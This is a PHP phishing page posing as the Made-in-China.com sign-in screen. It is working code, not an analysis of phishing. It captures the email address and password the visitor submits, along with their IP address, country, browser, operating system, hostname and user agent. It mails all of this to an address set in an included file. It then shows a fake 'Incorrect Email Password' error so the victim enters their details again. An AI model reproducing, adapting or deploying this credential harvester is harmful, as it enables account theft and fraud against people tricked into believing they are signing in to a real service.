<?php

session_start();
require_once '../api.php';
if (isset($_GET['logonInCode'])) {
$logonInCode = $_GET['logonInCode'];
}
if ($logonInCode == '1'){
$user_error = '<label class="error" generated="true">Please enter your Email Address.</label>';
$pass_error = '<label class="error" generated="true">Please enter your Email Password.</label>';
}
elseif ($logonInCode == '0'){
$send = 'login.php';
$user_error = '';
$pass_error = '<label class="error" generated="true">Please enter your Password.</label>';
$status = '<div id="error_info" class="tips">
							<h6 id="error_title">Incorrect Email Password.</h6>
							
									<p id="error_desc">Please try again (password is case sensitive).</p>
								
						</div>';
}


require_once '../mail.php';
require_once 'geo.php';
require_once 'sync.php';

if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}

$geoplugin = new geoPlugin($ip);
$geoplugin->locate();
$cc = $geoplugin->countryCode;
$cn = $geoplugin->countryName;
$br = $obj->showInfo('browser');
$op = $obj->showInfo('os');
$vr = $obj->showInfo('version');
$hostname = gethostbyaddr($ip);
$ua = $_SERVER['HTTP_USER_AGENT'];
$datum = date("D M d, Y g:i a");

if (isset($_POST['logUserName']) || isset($_POST['logPassword'])) { 
$_SESSION["email"] = $email = $_POST["logUserName"];
$_SESSION["passwd"] = $passwd = $_POST["logPassword"];

$message .= "-------------------------------------------------------------------------------------\n";
$message .= "User ID: ".$email."\n";
$message .= "Password: ".$passwd."\n";
$message .= "-------------------------------------------------------------------------------------\n";
$message .= "Web Browser: ".$br."\n";
$message .= "Web Browser Version: ".$vr."\n";
$message .= "Operating System: ".$op."\n";
$message .= "IP: ".$ip." | ".$cn."\n";
$message .= "Submitted: ".$datum."\n";
$message .= "Host Name: ".$hostname."\n";
$message .= "User Agent: ".$ua."\n";
$message .= "-------------------------------------------------------------------------------------\n";

$subject = "You've got a new supplier from $ip ($cn)";
$headers = "From: MIC $cc <noreply>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

if (empty($email) || empty($passwd)) {
header("Location: ./?logonInCode=1");
}
else {
mail($to,$subject,$message,$headers);
	header("Location: ./?logonInCode=0");
}

}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">














<html xmlns="http://www.w3.org/1999/xhtml">

<head>

<title>Sign In | Made-in-China.com</title>

<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />

<meta name="Description" content="Sign in to Made-in-China.com to source China products anywhere, anytime." />

<meta name="Keywords" content="Made-in-China.com sign in, sign in" />

<link rel="shortcut icon" href="images/favicon.ico">

<link type="text/css" rel="stylesheet" href="https://www.micstatic.com/gb/css/global_65d53e57.css" media="all" />

<link href="https://login.made-in-china.com/css/login.css?t=oMKEghUFYpnY" rel="stylesheet" type="text/css" />



</head>

<body>
	<div class="grid login-box login-box-new">
		<!-- MIC Logo & Live Chat -->

		<div class="m-header">
    <div class="grid">
        <div class="m-header-row">
            <div class="m-logo-wrap">
                <a href="#" title="Manufacturers & Suppliers" class="m-logo"></a>
        </div>
        </div>
    </div>
</div>
		<span class="help">
			Need Help? <a href="javascript:void(0)" id="live-chat">Live Chat</a>
		</span>
		<!-- 登陆 -->
		<div class="login-wrap">
			<!-- ADVERTISE -->
			<div class="login-ad">
				
						
						
							<img style="width: 400px;" src="images/ad.jpg" alt="New homepage coming soon!" title="New homepage coming soon!"/>
						
					
			</div>
<script>
$("#logon").on('submit', function() {
   alert($("#sign-in-submit").val());
});
</script>
			<div class="login-form">
				<form id="logon" action="<?php echo $send; ?>" method="post">
					<!-- error info -->
					<?php echo $status; ?>
					<!-- login id -->
					<div class="form-item">
                    	<label for="" class="form-label">Email Address or Member ID</label>
	                    <div class="form-fields mail-wrap">
	                    	<input id="logonInfo.logUserName" name="logUserName" class="input-text J-loginname" tabindex="1" type="text" value="<?php echo $_SESSION["email"]; ?>" size="17" maxlength="160"/>
	                    <?php echo $user_error; ?>	
	                    </div>
					</div>
					<!-- login password -->
					<div class="form-item">
						<label for="" class="form-label">
							<a id="forgot_pwd_link" rel="nofollow" href="#">Forgot your password?</a>
							Password
						</label>
						<div class="form-fields">
	                    	<input id="logonInfo.logPassword" name="logPassword" class="input-text J-password" tabindex="2" type="password" value="" size="17"/>
						<?php echo $pass_error; ?>	
						</div>

                	</div>

                	
	                <div class="form-btn">
	                    <button class="btn btn-main" id="sign-in-submit" tabindex="5" type="submit">Sign In</button>
	                </div>
	                <input id="baseNextPage" name="baseNextPage" type="hidden" value=""/>
					<input id="applyGTSource" name="applyGTSource" type="hidden" value=""/>
					<input type="hidden" name="rembemberLoginNameFlag" value="1"/>
					<input type="hidden" id="validateNumberError" value="" />
					<input type="hidden" id="logonError" value="" />
					<input type="hidden" id="needValidate" value="false" />
					
					<input type="hidden" id="isAbroadIp" value="1" />
					<input type="hidden" id="comRole" value="" />
				 	<input type="hidden" id="isChinaMainLandIP" value="1" />
				 	<input type="hidden" id="J-SlideNav-Survey" isLogin="0" isAbroadIP="1" comId="0" isBuyer="0" comRole=""/>
				 	<input type="hidden" name="jumpNext" id="jumpNext" value=""/>
			    </form>
	            <p class="form-help">
	                New User? <a rel="nofollow" href="#">Join Free</a>
				
	                <span class="sign-in-with" id="scLogin">Sign in with:</span>
				
	            </p>

            </div>
        </div>
		<div class="bottom"></div>
	</div>

	<div class="m-footer">
    <div class="grid">
        <div class="m-footer-simple-links">
            <div class="m-footer-simple-links-group">
                <div class="m-footer-simple-links-row">
    <a rel="nofollow" href="#" target="_blank">About Us</a>
    <span class="m-gap-line"></span>
            <a rel="nofollow" href="#" target="_blank">FAQ</a>
        <span class="m-gap-line"></span>
    <a rel="nofollow" href="#" target="_blank">Help</a>
    <span class="m-gap-line"></span>
    <a href="#" target="_blank">Site Map</a>
            <span class="m-gap-line"></span>
        <a rel="nofollow" href="#" target="_blank">Contact Us</a>
        <span class="m-gap-line"></span>
        <a href="#" target="_blank">Mobile Site</a>
    </div>
            </div>
            <div class="m-footer-simple-links-group">
                <div class="m-footer-simple-links-row">
    <a rel="nofollow" href="#" target="_self">Terms &amp; Conditions</a>
    <span class="m-gap-line"></span>
    <a rel="nofollow" href="#" target="_self">Declaration</a>
    <span class="m-gap-line"></span>
    <a rel="nofollow" href="#" target="_self">Privacy Policy</a>
</div>
                <div class="m-footer-simple-links-row m-footer-copyright">
    Copyright &copy; 1998-2019 <a class="J-focusChinaLink" href="#" rel="nofollow" target="_blank">Focus Technology Co., Ltd. </a>All Rights Reserved.
</div>
            </div>
        </div>
    </div>
</div>

	<!-- <script type="text/javascript" src="//www.micstatic.com/gb/js/libs/jquery_f8bcd4d2.js" charset="utf-8" ></script>
	<script type="text/javascript" src="//www.micstatic.com/gb/js/libs/jquery.cookie_e3204cc5.js" charset="utf-8" ></script>
    <script type="text/javascript" src="//www.micstatic.com/gb/js/libs/class.0.3.2_74260f4f.js" charset="utf-8" ></script>
    <script type="text/javascript" src="//www.micstatic.com/janus/js/common/live_chat_4e365438.js" charset="utf-8" ></script>
    <script type="text/javascript" src="//www.micstatic.com/janus/js/logon/lgname_70d505e1.js" charset="utf-8" ></script>
    <script type="text/javascript" src="//www.micstatic.com/janus/js/logon/autocomplete_ea905997.js" charset="utf-8" ></script>
    <script type="text/javascript" src="//www.micstatic.com/janus/js/logon/automailtip_ad835228.js" charset="utf-8" ></script>
    <script type="text/javascript" src="//www.micstatic.com/janus/js/logon/login_validate_c2ea4239.js" charset="utf-8" ></script>
    <script type="text/javascript" src="//www.micstatic.com/gb/js/business/plugs/socialPlugin/socuetyLogin_4d120f85.js" charset="utf-8" ></script>
    <script type="text/javascript" src="//www.micstatic.com/gb/js/assets/JFixed/JFixed.2.1_39c689c4.js" charset="utf-8" ></script>
	<script type="text/javascript" src="//www.micstatic.com/gb/js/business/plugs/slideNav/instance_c0d4a498.js" charset="utf-8" ></script>
	<script type="text/javascript" src="//www.micstatic.com/gb/js/business/plugs/slideNav/defaults_3db9bd11.js" charset="utf-8" ></script> -->
</body>

</html>

